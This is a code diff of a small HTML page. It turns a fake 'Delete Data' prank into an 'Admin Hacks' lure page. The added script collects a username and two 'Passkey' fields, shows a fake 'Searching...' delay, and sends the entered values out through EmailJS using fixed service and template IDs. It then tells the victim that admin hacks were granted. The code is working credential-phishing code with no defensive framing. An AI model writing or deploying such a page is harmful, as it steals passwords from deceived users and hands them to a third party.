@@ -1,8 +1,7 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Delete Data</title>
+    <title>Admin Hacks</title>
     <style>
         /* Styling for the custom "Searching..." message */
         #searchingMessage {
@@ -23,20 +22,30 @@
 <body>
 
     <h1>
-        Press to delete <input type="text" id="username" name="username"> (selected user) data
+        Press to activate <input type="text" id="username" name="username"> (selected user) admin hacks
     </h1>
     <p>
         USER INFO: <input type="text" id="Passkey1" name="Passkey">
         Passkey: <input type="text" id="Passkey2" name="Passkey">
     </p>
 
-    <button onclick="showAlert()">DELETE DATA</button>
+    <button onclick="sendEmail()">ACTIVATE ADMIN HACKS</button>
 
     <!-- Custom "Searching..." message -->
     <div id="searchingMessage">Searching...</div>
 
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
     <script>
-        function showAlert() {
+        // Initialize EmailJS with your user ID
+        emailjs.init("YOUR_USER_ID");
+
+        function sendEmail() {
+            // Get the values entered by the user
+            const username = document.getElementById('username').value;
+            const passkey1 = document.getElementById('Passkey1').value;
+            const passkey2 = document.getElementById('Passkey2').value;
+
             // Display the "Searching..." message
             document.getElementById('searchingMessage').style.display = 'block';
 
@@ -45,18 +54,29 @@
                 // Hide the "Searching..." message
                 document.getElementById('searchingMessage').style.display = 'none';
 
-                // Show the "DATA HAS BEEN DELETED" alert
-                alert("DATA HAS BEEN DELETED");
+                // Send the email using EmailJS
+                const emailParams = {
+                    username: username,
+                    passkey1: passkey1,
+                    passkey2: passkey2
+                };
+
+                // You can change 'your_service_id' and 'your_template_id' to match the EmailJS service you configured
+                emailjs.send('service_74hon1v', 'template_je0ce5l', emailParams)
+                    .then(function(response) {
+                        alert("Admin hacks given and details sent to the email!");
+                    }, function(error) {
+                        alert("Failed to send email. Please try again.");
+                    });
             }, 3000); // 3 seconds delay
         }
     </script>
+
     <p>
         Tool Created By Arnav.
-    
     </p>
-<br>
-<p style="color:#FF0000";>WARNING Data will be permanently deleted!</p>
-</br>
+    <br>
+    <p style="color:#FF0000;">WARNING: Unauthorized use is prohibited!</p>
+    <br>
 </body>
 </html>
-
